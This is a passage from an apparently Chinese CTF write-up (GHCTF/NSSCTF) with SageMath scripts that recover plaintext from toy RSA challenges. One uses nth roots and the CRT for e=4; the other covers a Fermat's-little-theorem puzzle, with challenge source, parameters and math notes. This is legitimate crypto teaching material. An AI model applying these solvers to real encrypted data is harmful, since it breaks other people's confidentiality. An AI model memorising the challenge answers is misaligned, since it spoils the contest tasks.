class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;NSSCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里也贴一个别的师傅的<a href="https://seandictionary.top/ghctf-2025/">脚本</a>(可以不用上面较为复杂的<code>AMM</code>，所以代码比较简洁)，利用<code>nth_root</code>进行开方根并<code>crt</code>求解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e= <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">gcd = GCD(e,phi)</span><br><span class="line"> </span><br><span class="line">res1 = Zmod(p)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">res2 = Zmod(q)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt([<span class="built_in">int</span>(i),<span class="built_in">int</span>(j)],[p,q])</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="ez_fermat"><a class="markdownIt-Anchor" href="#ez_fermat"></a> EZ_Fermat</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = R(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p),n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line"><span class="string">f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1</span></span><br><span class="line"><span class="string">w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>根据费马小定理，</mtext><msup><mn>2</mn><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo><mo>≡</mo><msup><mn>2</mn><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mtext>，这步</mtext><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mtext>就可以直接解了</mtext></mrow><annotation encoding="application/x-tex">根据费马小定理，2^{f(p)}(mod\ n)\equiv 2^{f(p)\ mod\ (p-1)}(mod\ p)，这步sage就可以直接解了</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">费</span><span class="mord cjk_fallback">马</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">d</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">步</span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">了</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>或者有，</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mn>57</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">或者有，f(p)=f(1)=-57\ mod\ p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord">5</span><span class="mord">7</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>为什么二者相等呢？因为</mtext></mrow><annotation encoding="application/x-tex">为什么二者相等呢？因为</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">什</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">呢</span><span class="mord cjk_fallback">？</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><mo>∗</mo><msup><mi>x</mi><mi>n</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>∗</mo><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>∗</mo><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo>∗</mo><msup><mi>x</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">f(x)=a_{n}*x^{n}+a_{n-1}*x^{n-1}+a_{n-2}*x^{n-2}+...+a_{0}*x^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.747722em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.673611em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.673611em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f(p)\ mod\ p-1=a_{n}+a_{n-1}+a_{n-2}+...+a_{0}=f(1)\ mod\ p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span 